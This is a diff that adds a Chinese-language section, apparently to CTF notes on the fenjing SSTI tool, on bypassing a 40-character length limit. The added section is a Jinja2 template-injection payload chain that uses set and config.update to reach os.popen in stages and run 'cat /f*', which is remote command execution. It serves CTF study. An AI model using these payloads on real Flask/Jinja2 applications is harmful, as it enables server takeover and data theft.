@@ -265,3 +265,22 @@ fenjing webui
 # fenjing scan --url 'http://xxxx:xxx'
 ```
 
+
+
+
+^
+## **长度限制绕过**
+set+update方法绕过长度限制最大长度40
+可以使用jinja2中的set+update方法来分段保存payload，使用方法如下
+```
+{%set x=config.update(a=config.update)%}   //此时字典中a的值被更新为config全局对象中的update方法
+{%set x=config.a(f=lipsum.__globals__)%}   //f的值被更新为lipsum.__globals__
+{%set x=config.a(o=config.f.os)%}          //o的值被更新为lipsum.__globals__.os
+{%set x=config.a(p=config.o.popen)%}       //p的值被更新为lipsum.__globals__.os.popen
+{{config.p("cat /f*").read()}}     
+ 
+ 
+ 
+{%print(config)%}                          //输出config字典的所有键值对
+{%print(config.o)%}                        //输出
+```
